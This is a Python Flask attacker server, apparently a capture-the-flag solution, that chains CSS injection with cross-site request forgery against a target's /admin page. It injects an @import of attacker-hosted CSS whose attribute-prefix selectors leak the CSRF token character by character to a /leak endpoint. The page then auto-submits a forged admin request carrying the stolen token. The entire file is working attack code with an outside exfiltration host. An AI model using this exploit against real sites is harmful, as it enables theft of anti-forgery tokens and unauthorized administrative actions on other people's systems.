from flask import Flask, Response, request

app = Flask(__name__)

TARGET_SERVER = "http://web:5000"
MY_SERVER = "http://localhost:31415"  # Your server's IP address

token_string = "0123456789abcdef"

csrf_token = ""


@app.route("/")
def index():
    return f"""
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <form action="{TARGET_SERVER}/admin" method="POST">
        <input type="hidden" name="csrf_token" value="">
        <input type="hidden" name="username" value="satoki00">
        <input type="submit" value="Submit CSRF Request">
    </form>
    <script>
        let count = 0;
        setInterval(() => {{
            if (count > 40) {{
                fetch('/token')
                    .then(response => response.text())
                    .then(text => {{
                        document.querySelector('input[name="csrf_token"]').value = text;
                        document.forms[0].submit();
                    }})
            }}
            window.open('{TARGET_SERVER}/admin?message=%3Cstyle%3E@import%20url({MY_SERVER}/payload);%3C/style%3E');
            count++;
        }}, 1000);
    </script>
</body>
</html>
"""


@app.route("/payload")
def payload():
    css_payload = ""
    for c in token_string:
        css_payload += f"input[name='csrf_token'][value^='{csrf_token + c}'] ~ * {{ background-image: url('{MY_SERVER}/leak?token={csrf_token + c}'); }}\n"
    return Response(css_payload, mimetype="text/css")


@app.route("/leak")
def leak():
    token = request.args.get("token", "")
    global csrf_token
    csrf_token = token
    print(f"[LEAK] csrf_token = {csrf_token}")
    return ":)"


@app.route("/token")
def token():
    if len(csrf_token) != 32:
        print(f"[OMG] csrf_token = {csrf_token}")
    return csrf_token


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=31415)
